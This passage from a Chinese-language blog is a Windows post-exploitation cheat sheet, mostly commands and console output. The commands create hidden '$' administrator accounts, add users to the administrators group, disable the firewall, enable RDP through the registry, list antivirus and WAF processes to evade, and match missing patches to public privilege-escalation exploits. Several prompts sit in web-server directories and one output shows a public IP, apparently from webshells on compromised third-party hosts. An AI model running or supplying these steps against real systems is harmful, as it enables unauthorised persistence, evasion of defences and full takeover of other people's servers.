C:\Windows</span><br><span class="line">系統目錄:             C:\Windows\system32</span><br><span class="line">開機裝置:             \Device\HarddiskVolume1</span><br><span class="line">系統地區設定:         zh-tw;中文 (台灣)</span><br><span class="line">輸入法地區設定:       zh-tw;中文 (台灣)</span><br><span class="line">時區:                 (UTC+<span class="number">08</span>:<span class="number">00</span>) 台北</span><br><span class="line">實體記憶體總計:       <span class="number">8</span>,<span class="number">191</span> MB</span><br><span class="line">可用實體記憶體:       <span class="number">5</span>,<span class="number">350</span> MB</span><br><span class="line">虛擬記憶體: 大小上限: <span class="number">9</span>,<span class="number">471</span> MB</span><br><span class="line">虛擬記憶體: 可用:     <span class="number">6</span>,<span class="number">445</span> MB</span><br><span class="line">虛擬記憶體: 使用中:   <span class="number">3</span>,<span class="number">026</span> MB</span><br><span class="line">分頁檔位置:           C:\pagefile.sys</span><br><span class="line">網域:                 WORKGROUP</span><br><span class="line">登入伺服器:           N/A</span><br><span class="line">Hotfix:               已安裝 <span class="number">17</span> Hotfix。</span><br><span class="line">                      [<span class="meta">01</span>]: KB3192137</span><br><span class="line">                      [<span class="meta">02</span>]: KB4091664</span><br><span class="line">                      [<span class="meta">03</span>]: KB4093137</span><br><span class="line">                      [<span class="meta">04</span>]: KB4132216</span><br><span class="line">                      [<span class="meta">05</span>]: KB4465659</span><br><span class="line">                      [<span class="meta">06</span>]: KB4485447</span><br><span class="line">                      [<span class="meta">07</span>]: KB4498947</span><br><span class="line">                      [<span class="meta">08</span>]: KB4503537</span><br><span class="line">                      [<span class="meta">09</span>]: KB4509091</span><br><span class="line">                      [<span class="meta">10</span>]: KB4512574</span><br><span class="line">                      [<span class="meta">11</span>]: KB4520724</span><br><span class="line">                      [<span class="meta">12</span>]: KB4521858</span><br><span class="line">                      [<span class="meta">13</span>]: KB4524244</span><br><span class="line">                      [<span class="meta">14</span>]: KB4540723</span><br><span class="line">                      [<span class="meta">15</span>]: KB4550994</span><br><span class="line">                      [<span class="meta">16</span>]: KB4562561</span><br><span class="line">                      [<span class="meta">17</span>]: KB4561616</span><br><span class="line">網路卡:               已安裝 <span class="number">1</span> NIC。</span><br><span class="line">                      [<span class="meta">01</span>]: vmxnet3 乙太網路介面卡</span><br><span class="line">                            連線名稱:           乙太網路</span><br><span class="line">                            DHCP 已啟用:          是</span><br><span class="line">                            DHCP 伺服器:        <span class="number">210.71</span><span class="number">.253</span><span class="number">.224</span></span><br><span class="line">                            IP 位址</span><br><span class="line">                            [<span class="meta">01</span>]: <span class="number">210.65</span><span class="number">.11</span><span class="number">.201</span></span><br><span class="line">                            [02]: fe80::250:56ff:fe80:2244</span><br><span class="line">Hyper-V 需求:         偵測到 Hypervisor。將不會顯示 Hyper-V 所需的功能。</span><br></pre></td></tr></table></figure><h4 id="net-group"><a href="#net-group" class="headerlink" title="net group"></a>net group</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">键入不带参数的Net <span class="keyword">group</span>显示服务器名称及服务器的组名称</span><br></pre></td></tr></table></figure><ul><li>net group</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; net <span class="keyword">group</span></span><br><span class="line">這個命令只能用在 Windows 網域控制站。</span><br><span class="line">詳細資料，請輸入 NET HELPMSG <span class="number">3515</span>。</span><br><span class="line"><span class="comment">//该主机不是DC，无法使用此命令。</span></span><br></pre></td></tr></table></figure><h4 id="net-localgroup"><a href="#net-localgroup" class="headerlink" title="net localgroup"></a>net localgroup</h4><p>显示管理员组中的所有成员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Remote Desktop</span><br></pre></td></tr></table></figure><p>将test用户加入到管理员组/远程桌面组中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators service &#x2F;add</span><br></pre></td></tr></table></figure><p>将test用户从管理员组/远程桌面组中删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators test &#x2F;del</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; net localgroup administrators</span><br><span class="line">別名     administrators</span><br><span class="line">註解     Administrators 可以完全不受限制地存取電腦&#x2F;網域</span><br><span class="line">成員</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">key$</span><br><span class="line">test</span><br><span class="line">WDeployAdmin</span><br><span class="line">命令已經成功完成</span><br></pre></td></tr></table></figure><h4 id="查看端口以及端口对应的服务"><a href="#查看端口以及端口对应的服务" class="headerlink" title="查看端口以及端口对应的服务"></a>查看端口以及端口对应的服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看对应的端口</span><br><span class="line">netstat -ano |findstr &quot;3306&quot;</span><br><span class="line">查看对应的服务进程</span><br><span class="line">tasklist | findstr PID</span><br></pre></td></tr></table></figure><h4 id="建立隐藏账号"><a href="#建立隐藏账号" class="headerlink" title="建立隐藏账号"></a>建立隐藏账号</h4><p>建立用户账号时，如果在用户名后面加上$符号，就可以建立一个简单的隐藏账号，如”test$”。在字符界面下执行net user命令，无法查看到这个账号，但是在图形界面的”本地用户和组”中仍然可以看到。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user awd$ 123 &#x2F;add</span><br></pre></td></tr></table></figure><p>安全标识符SID：</p><p>执行”whoami /all”命令查看系统当前用户的SID。SID的最后一部分称为相对标识符RID，RID是500的SID是系统内置Administrator账户，即使重命名，其RID仍保持为500不变。 RID为501的SID是Guest账户，后来新建的用户账户的RID都是从1000开始。</p><h4 id="查看当前在线的用户"><a href="#查看当前在线的用户" class="headerlink" title="查看当前在线的用户"></a>查看当前在线的用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; query user || qwinsta</span><br><span class="line"> 使用者名称         工作阶段名称       识别码  状态    闲置时间    登入时间</span><br><span class="line"> administrator         rdp-tcp#3           1  使用中          .  2020&#x2F;11&#x2F;19 下午 03:32</span><br><span class="line"> 工作阶段名称       使用者名称           识别码    状态    类型    装置 </span><br><span class="line">&gt;console                                     0  已连线  wdcon               </span><br><span class="line"> rdp-tcp                                 65536  接听    rdpwd               </span><br><span class="line"> rdp-tcp#3         Administrator             1  使用中  rdpwd  </span><br></pre></td></tr></table></figure><h4 id="查看当前用户是否在管理员组"><a href="#查看当前用户是否在管理员组" class="headerlink" title="查看当前用户是否在管理员组"></a>查看当前用户是否在管理员组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br><span class="line">別名     administrators</span><br><span class="line">註解     Administrators 可以完全不受限制地存取電腦&#x2F;網域</span><br><span class="line"></span><br><span class="line">成員</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">banli$</span><br><span class="line">Guest</span><br><span class="line">IUSR_TELNET</span><br><span class="line">TelNet</span><br><span class="line">命令執行成功</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user administrator</span><br><span class="line">本機群組會員           *Administrators       *Performance Monitor U</span><br><span class="line">                       *SQLServer2005SQLBrows*SQLServerMSASUser$REN</span><br><span class="line">                       *SQLServerMSSQLUser$re*SQLServerSQLAgentUser</span><br><span class="line">通用群組會員           *None</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group administrators</span><br><span class="line">该命令只能在域控制器中使用。</span><br></pre></td></tr></table></figure><h4 id="查看防火墙"><a href="#查看防火墙" class="headerlink" title="查看防火墙"></a>查看防火墙</h4><p>显示防火墙状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; netsh firewall show config</span><br><span class="line">网域 设定档组态:</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">操作模式                          &#x3D; 停用</span><br><span class="line">例外模式                          &#x3D; 启用</span><br><span class="line">多点传送&#x2F;广播回应模式             &#x3D; 启用</span><br><span class="line">通知模式                          &#x3D; 启用</span><br><span class="line">网域 设定档的服务设定:</span><br><span class="line">模式     自订           名称</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">启用       否           档案及印表机共用</span><br><span class="line">网域 设定档允许的程式设定:</span><br><span class="line">模式     名称 &#x2F; 程式</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">启用       Message Queuing &#x2F; C:\WINDOWS\system32\mqsvc.exe</span><br><span class="line">网域 设定档的连接埠设定:</span><br><span class="line">连接埠 通讯协定  模式       名称</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">139    TCP       启用       NetBIOS Session Service</span><br><span class="line">445    TCP       启用       SMB over TCP</span><br><span class="line">137    UDP       启用       NetBIOS Name Service</span><br><span class="line">138    UDP       启用       NetBIOS Datagram Service</span><br><span class="line">标准 设定档组态:</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">操作模式                          &#x3D; 启用</span><br><span class="line">例外模式                          &#x3D; 启用</span><br><span class="line">多点传送&#x2F;广播回应模式             &#x3D; 启用</span><br><span class="line">通知模式                          &#x3D; 启用</span><br><span class="line">标准 设定档的服务设定:</span><br><span class="line">模式     自订           名称</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">启用       否           远端桌面</span><br><span class="line">标准 设定档允许的程式设定:</span><br><span class="line">模式     名称 &#x2F; 程式</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">启用       3389 &#x2F; C:\wmpub\wmiislog\Saom\3389.exe</span><br><span class="line">启用       3389 &#x2F; C:\Documents and Settings\IUSR_TELNET\桌面\3389.exe</span><br><span class="line">标准 设定档的连接埠设定:</span><br><span class="line">连接埠 通讯协定  模式       名称</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">80     TCP       启用       JCINWEB</span><br><span class="line">21     TCP       启用       FTP</span><br><span class="line">3389   TCP       启用       远端桌面</span><br><span class="line">记录设定:</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">档案位置        &#x3D; C:\WINDOWS\pfirewall.log</span><br><span class="line">最大档案大小    &#x3D; 4096 KB</span><br><span class="line">丢弃的封包      &#x3D; 停用</span><br><span class="line">连线            &#x3D; 停用</span><br><span class="line">存取被拒。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">查看防火墙规则对某端口的规则</span><br><span class="line">netsh advfirewall firewall show rule name&#x3D;all</span><br><span class="line">規則名稱:                             遠端桌面 - 使用者模式 (TCP-In)</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">啟用: 是</span><br><span class="line">方向: 在</span><br><span class="line">設定檔:                               網域,私人,公用</span><br><span class="line">群組: 遠端桌面</span><br><span class="line">LocalIP:                              任一</span><br><span class="line">RemoteIP:                             任一</span><br><span class="line">通訊協定:                             TCP</span><br><span class="line">本機連接埠:                           3389</span><br><span class="line">遠端連接埠:                           任一</span><br><span class="line">邊緣周遊:                             否</span><br><span class="line">動作: 允許</span><br></pre></td></tr></table></figure><h5 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winserver 2003之前：netsh firewall set opmode disable</span><br><span class="line">winserver 2003之后：netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h5 id="开启防火墙"><a href="#开启防火墙" class="headerlink" title="开启防火墙"></a>开启防火墙</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode mode&#x3D;enable</span><br></pre></td></tr></table></figure><h4 id="3389端口"><a href="#3389端口" class="headerlink" title="3389端口"></a>3389端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询远程桌面服务是否开启</span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections</span><br></pre></td></tr></table></figure><p>1表示关闭，0表示开启 <img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200613203237617.png" alt="image-20200613203237617"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询远程桌面服务端口</span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber</span><br></pre></td></tr></table></figure><p>端口号十六进制表示，0xd3d转换成十进制后为3389</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200613203325747.png" alt="image-20200613203325747"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令行开启远程桌面</span><br><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br><span class="line">命令行关闭远程桌面</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</span><br></pre></td></tr></table></figure><p>关闭远程桌面</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200613204834299.png" alt="image-20200613204834299"></p><p>突破防火墙连接3389端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">防火墙默认阻断了3389的连接，需要手动开启，执行如下命令</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br><span class="line">或者直接关闭防火墙</span><br><span class="line">netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure><p>常见用户尝试连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\WWW\yxcms&gt; net user whoami Steady123 &#x2F;add</span><br><span class="line">命令成功完成。</span><br><span class="line"> </span><br><span class="line">C:\phpStudy\WWW\yxcms&gt; net localgroup administrators whoami &#x2F;add</span><br></pre></td></tr></table></figure><h4 id="查看系统进程"><a href="#查看系统进程" class="headerlink" title="查看系统进程"></a>查看系统进程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; tasklist</span><br><span class="line">Image Name                     PID Session Name        Session<span class="comment">#    Mem Usage</span></span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process              <span class="number">0</span>                            <span class="number">0</span>         <span class="number">24</span> K</span><br><span class="line">System                           <span class="number">4</span>                            <span class="number">0</span>         <span class="number">52</span> K</span><br><span class="line">smss.exe                       <span class="number">312</span>                            <span class="number">0</span>        <span class="number">632</span> K</span><br><span class="line">csrss.exe                      <span class="number">396</span>                            <span class="number">0</span>      <span class="number">2</span>,<span class="number">736</span> K</span><br><span class="line">wininit.exe                    <span class="number">448</span>                            <span class="number">0</span>        <span class="number">764</span> K</span><br><span class="line">csrss.exe                      <span class="number">456</span>                            <span class="number">1</span>        <span class="number">336</span> K</span><br><span class="line">winlogon.exe                   <span class="number">488</span>                            <span class="number">1</span>      <span class="number">1</span>,<span class="number">048</span> K</span><br><span class="line">services.exe                   <span class="number">544</span>                            <span class="number">0</span>      <span class="number">8</span>,<span class="number">416</span> K</span><br><span class="line">lsass.exe                      <span class="number">552</span>                            <span class="number">0</span>     <span class="number">17</span>,<span class="number">500</span> K</span><br><span class="line">lsm.exe                        <span class="number">560</span>                            <span class="number">0</span>      <span class="number">4</span>,<span class="number">108</span> K</span><br><span class="line">svchost.exe                    <span class="number">664</span>                            <span class="number">0</span>     <span class="number">14</span>,<span class="number">340</span> K</span><br><span class="line">svchost.exe                    <span class="number">740</span>                            <span class="number">0</span>      <span class="number">7</span>,<span class="number">808</span> K</span><br><span class="line">MsMpEng.exe                    <span class="number">808</span>                            <span class="number">0</span>    <span class="number">186</span>,<span class="number">060</span> K</span><br><span class="line">LogonUI.exe                    <span class="number">828</span>                            <span class="number">1</span>      <span class="number">1</span>,<span class="number">224</span> K</span><br><span class="line">svchost.exe                    <span class="number">928</span>                            <span class="number">0</span>     <span class="number">64</span>,<span class="number">288</span> K</span><br></pre></td></tr></table></figure><h4 id="查看已启动的程序信息"><a href="#查看已启动的程序信息" class="headerlink" title="查看已启动的程序信息"></a>查看已启动的程序信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; wmic startup get command,caption</span><br><span class="line">Caption             Command                                                                                        </span><br><span class="line">ctfmon.exe          C:\WINDOWS\system32\CTFMON.EXE                                                                 </span><br><span class="line">ctfmon.exe          C:\WINDOWS\system32\CTFMON.EXE                                                                 </span><br><span class="line">ctfmon.exe          C:\WINDOWS\system32\CTFMON.EXE                                                                 </span><br><span class="line">desktop             desktop.ini                                                                                    </span><br><span class="line">Windows Search      C:\PROGRA~1\WINDOW~4\WINDOW~1.EXE  &#x2F;startup                                                    </span><br><span class="line">IMJPMIG8.1          &quot;C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE&quot; &#x2F;Spoil &#x2F;RemAdvDef &#x2F;Migration32                            </span><br><span class="line">IMEKRMIG6.1         C:\WINDOWS\ime\imkr6_1\IMEKRMIG.EXE                                                            </span><br><span class="line">CJIMETIPSYNC        C:\Program Files\Common Files\Microsoft Shared\IME\IMTC65\CHANGJIE\CINTLCFG.EXE &#x2F;CJIMETIPSync  </span><br><span class="line">PHIMETIPSYNC        C:\Program Files\Common Files\Microsoft Shared\IME\IMTC65\PHONETIC\TINTLCFG.EXE &#x2F;PHIMETIPSync  </span><br><span class="line">MsmqIntCert         regsvr32 &#x2F;s mqrt.dll                                                                           </span><br><span class="line">Adobe ARM           &quot;C:\Program Files\Common Files\Adobe\ARM\1.0\AdobeARM.exe&quot;                                     </span><br><span class="line">SunJavaUpdateSched  &quot;C:\Program Files\Common Files\Java\Java Update\jusched.exe&quot; </span><br></pre></td></tr></table></figure><h4 id="查看系统体系架构"><a href="#查看系统体系架构" class="headerlink" title="查看系统体系架构"></a>查看系统体系架构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><h4 id="常见软件杀毒进程"><a href="#常见软件杀毒进程" class="headerlink" title="常见软件杀毒进程"></a>常见软件杀毒进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;360tray.exe&quot;,    &quot;360安全卫士&quot;&#125;,</span><br><span class="line">&#123;&quot;360sd.exe&quot;,      &quot;360杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;a2guard.exe&quot;,    &quot;a-squared杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;ad-watch.exe&quot;,    &quot;Lavasoft杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;cleaner8.exe&quot;,    &quot;The Cleaner杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;vba32lder.exe&quot;,    &quot;vb32杀毒&quot;&#125;,</span><br><span class="line">火绒</span><br><span class="line">hipstray.exe</span><br><span class="line">wsctrl.exe</span><br><span class="line">usysdiag.exe</span><br></pre></td></tr></table></figure><h4 id="常见WAF进程"><a href="#常见WAF进程" class="headerlink" title="常见WAF进程"></a>常见WAF进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安全狗</span><br><span class="line">SafeDogGuardCenter.exe</span><br><span class="line">safedogupdatecenter.exe</span><br><span class="line">safedogguardcenter.exe</span><br><span class="line">SafeDogSiteIIS.exe</span><br><span class="line">SafeDogTray.exe</span><br><span class="line">SafeDogServerUI.exe</span><br><span class="line">D盾</span><br><span class="line">D_Safe_Manage.exe</span><br><span class="line">d_manage.exe</span><br><span class="line">云锁</span><br><span class="line">yunsuo_agent_service.exe</span><br><span class="line">yunsuo_agent_daemon.exe</span><br></pre></td></tr></table></figure><h4 id="补丁安装情况与漏洞信息收集"><a href="#补丁安装情况与漏洞信息收集" class="headerlink" title="补丁安装情况与漏洞信息收集"></a>补丁安装情况与漏洞信息收集</h4><h5 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows-Exploit-Suggester"></a>Windows-Exploit-Suggester</h5><p>该工具可以将目标系统的补丁安装情况与微软的漏洞数据库进行对比，进而检测出目标系统中潜在的未修复漏洞。同时此工具还会告知用户针对于此漏洞是否有公开的exp和可用的Metasploit模块。</p><p>自动化地从微软下载漏洞补丁数据库，并将其以Excel表格的形式保存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  Windows-Exploit-Suggester-master .&#x2F;windows-exploit-suggester.py --update</span><br><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[+] writing to file 2020-11-17-mssb.xls</span><br><span class="line">[*] done</span><br></pre></td></tr></table></figure><p>补丁信息收集</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  Windows-Exploit-Suggester-master python windows-exploit-suggester.py  --database <span class="number">2020</span><span class="number">-11</span><span class="number">-17</span>-mssb.xls --systeminfo <span class="number">1.</span>txt</span><br><span class="line">[*] initiating winsploit version <span class="number">3.3</span>...</span><br><span class="line">[*] database file detected <span class="keyword">as</span> xls <span class="keyword">or</span> xlsx based on extension</span><br><span class="line">[*] attempting to read <span class="keyword">from</span> the systeminfo input file</span><br><span class="line">[+] systeminfo input file read successfully (utf<span class="number">-8</span>)</span><br><span class="line">[*] querying database file <span class="keyword">for</span> potential vulnerabilities</span><br><span class="line">[*] comparing the <span class="number">0</span> hotfix(es) against the <span class="number">356</span> potential bulletins(s) with a database of <span class="number">137</span> known exploits</span><br><span class="line">[*] there are now <span class="number">356</span> remaining vulns</span><br><span class="line">[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin</span><br><span class="line">[+] windows version identified <span class="keyword">as</span> <span class="string">&#x27;Windows 2003 SP2 32-bit&#x27;</span></span><br><span class="line">[*]</span><br><span class="line">[M] MS15<span class="number">-051</span>: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (<span class="number">3057191</span>) - Important</span><br><span class="line">[*]   https:<span class="comment">//github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC</span></span><br><span class="line">[*]   https:<span class="comment">//www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF</span></span><br></pre></td></tr></table></figure><p>可以看到目标系统为<code>Windows 2003 SP2 32-bit</code>，对应的漏洞信息会显示在下面。</p><h5 id="cmd查询补丁信息"><a href="#cmd查询补丁信息" class="headerlink" title="cmd查询补丁信息"></a>cmd查询补丁信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;saul.txt&amp;(for %i in ( KB4013389 KB3199135 KB3186973 KB3178466 KB3164038 KB3143145 KB3143141 KB3136041 K3134228 KB3089656 KB3067505 KB3077657 KB3057839 KB3057191 KB3031432 KB3036220 KB3023266 KB2989935 KB3011780 KB3000061 KB2992611 KB2975684 KB2914368 KB2850851 KB2840221 KB2778930 KB2972621 KB2671387 KB2592799 KB2566454 KB2503665 KB2393802 KB2305420 KB2267960 KB982799 KB2160329 KB977165 KB971468 KB975517 KB970483 KB959454 KB957097 KB958644 KB956803 KB941693 KB921883 KB899588 KB823980 ) do @type saul.txt|@find &#x2F;i &quot;%i&quot;|| @echo %i is Yes)&amp;del &#x2F;f &#x2F;q &#x2F;a saul.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 